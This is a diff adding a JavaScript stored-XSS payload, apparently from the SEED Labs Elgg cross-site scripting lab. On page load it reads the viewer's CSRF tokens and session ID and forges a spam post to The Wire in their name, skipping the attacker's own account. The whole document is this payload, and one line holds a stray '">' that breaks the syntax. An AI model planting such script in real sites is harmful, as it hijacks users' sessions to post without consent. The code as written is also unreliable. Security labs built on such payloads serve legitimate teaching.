@@ -1,0 +1,28 @@
+<script type="text/javascript">
+  window.onload = function(){
+    var ts ="&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token ="__elgg_token=" +  elgg.security.token.__elgg_token;
+    
+    var sendurl = "http://www.seed-server.com/action/thewire/add"; 
+
+    
+    var message = "To earn 12 USD/Hour(!), visit now\n";
+    var link = encodeURIComponent("http://www.seed-server.com/profile/samy">);
+    message = message + link;
+    
+    
+    var content = token +  ts + "&body=" + message;
+
+    var guid = elgg.session.user.guid; // Logged in user's GUID
+    
+    
+    if(guid !== 59){
+      
+      var Ajax = new XMLHttpRequest();
+      Ajax.open("POST", sendurl, true);
+      Ajax.setRequestHeader("Host", "www.seed-server.com");
+      Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      Ajax.send(content);
+    }
+  }
+</script>
